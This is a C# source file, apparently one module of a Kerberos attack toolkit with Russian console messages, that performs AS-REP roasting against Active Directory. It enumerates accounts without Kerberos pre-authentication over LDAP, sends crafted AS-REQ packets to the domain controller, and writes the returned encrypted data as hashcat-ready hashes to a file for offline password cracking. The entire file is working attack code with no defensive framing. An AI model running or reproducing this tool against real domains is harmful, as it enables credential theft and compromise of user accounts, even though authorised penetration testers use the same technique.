using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;

namespace krbengine
{
    public class AsRepRoastEngine
    {
        public static async Task RunAsync(Dictionary<string, string> opt)
        {
            string dcIp = opt["-dc-ip"];
            string domain = opt["-d"];

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[*] ЗАПУСК МОДУЛЯ: AS-REP ROAST");
            Console.WriteLine($"    DC: {dcIp} | Domain: {domain}");
            Console.ResetColor();

            List<string> targetsToRoast = new List<string>();

            if (opt.ContainsKey("-tu"))
            {
                string targetUser = opt["-tu"];
                Console.WriteLine($"\n[*] Режим: Прямая атака на пользователя {targetUser}");
                targetsToRoast.Add(targetUser);
            }
            else
            {
                if (!opt.ContainsKey("-u"))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] ОШИБКА: Для LDAP-разведки требуется флаг -u (user:pass или anonymous).");
                    Console.ResetColor();
                    return;
                }

                Console.WriteLine("\n[*] Режим: LDAP Разведка (поиск аккаунтов DONT_REQ_PREAUTH)...");
                
                string filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                string[] attributes = { "sAMAccountName" };

                try
                {
                    var searchResults = LdapClient.Search(dcIp, domain, opt["-u"], filter, attributes);

                    foreach (var entry in searchResults)
                    {
                        if (entry.ContainsKey("sAMAccountName") && entry["sAMAccountName"].Count > 0)
                        {
                            string sam = entry["sAMAccountName"][0];
                            Console.WriteLine($"[+] Найден уязвимый аккаунт: {sam}");
                            targetsToRoast.Add(sam);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Ошибка при LDAP-разведке: {ex.Message}");
                    Console.ResetColor();
                    return;
                }

                if (targetsToRoast.Count == 0)
                {
                    Console.WriteLine("[-] Уязвимые пользователи не найдены в базе LDAP.");
                    return;
                }

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"\n[?] Найдено {targetsToRoast.Count} целей. Начать извлечение хэшей? (Y/n): ");
                Console.ResetColor();

                if (Console.ReadLine()?.ToLower() == "n") return;
            }

            Console.WriteLine($"\n[*] Запуск формирования ASN.1 структур и извлечения хэшей...");
            
            foreach (var user in targetsToRoast)
            {
                await RoastUser(user, domain, dcIp);
            }

            Console.WriteLine("\n[*] Модуль AS-REProasting завершил работу.");
        }

        // Формирование AS-REQ без pre-authentication и извлечение AS-REP hash
        private static async Task RoastUser(string targetUser, string domain, string dcIp)
        {
            try
            {
                Console.WriteLine($"[*] Формирование AS-REQ для: {targetUser}@{domain}");

                var creds = new KerberosPasswordCredential(targetUser, "dummy_password", domain);
                var asReq = KrbAsReq.CreateAsReq(creds, default);
                
                asReq.Body.EType = new[] { 
                    EncryptionType.RC4_HMAC_NT, 
                    EncryptionType.AES256_CTS_HMAC_SHA1_96 
                };

                var encodedReq = asReq.EncodeApplication().ToArray();
                byte[] responseBytes = await NetworkClient.SendKerberosPacketAsync(encodedReq, dcIp);
                
                if (responseBytes == null) return;

                var responseData = new ReadOnlyMemory<byte>(responseBytes);

                try
                {
                    var krbError = KrbError.DecodeApplication(responseData);
                    Console.WriteLine($"[-] {targetUser}: Аккаунт защищен (преаутентификация требуется).");
                }
                catch
                {
                    var asRep = KrbAsRep.DecodeApplication(responseData);
                    int etype = (int)asRep.EncPart.EType;
                    string cipherHex = BitConverter.ToString(asRep.EncPart.Cipher.ToArray()).Replace("-", "").ToLower();

                    string hash;
                    string upperDomain = domain.ToUpper();

                    if (etype == 23) // RC4-HMAC
                    {
                        string checksum = cipherHex.Substring(0, 32);
                        string data = cipherHex.Substring(32);
                        hash = $"$krb5asrep$23${targetUser}@{upperDomain}:{checksum}${data}";
                    }
                    else // AES-256
                    {
                        string checksum = cipherHex.Substring(cipherHex.Length - 24);
                        string data = cipherHex.Substring(0, cipherHex.Length - 24);
                        hash = $"$krb5asrep$18${targetUser}${upperDomain}${checksum}${data}";
                    }
                    
                    string hashMode = etype == 23 ? "18200" : "19700";
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] УСПЕХ! Извлечен зашифрованный TGT (ETYPE {etype})");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"    Hashcat Mode : -m {hashMode}");
                    Console.WriteLine($"\n{hash}\n");
                    Console.ResetColor();
                    
                    await File.AppendAllTextAsync("asrep_hashes.txt", hash + Environment.NewLine);
                }
            }
            catch (Exception ex) 
            { 
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Ошибка извлечения для {targetUser}: {ex.Message}"); 
                Console.ResetColor();
            }
        }
    }
}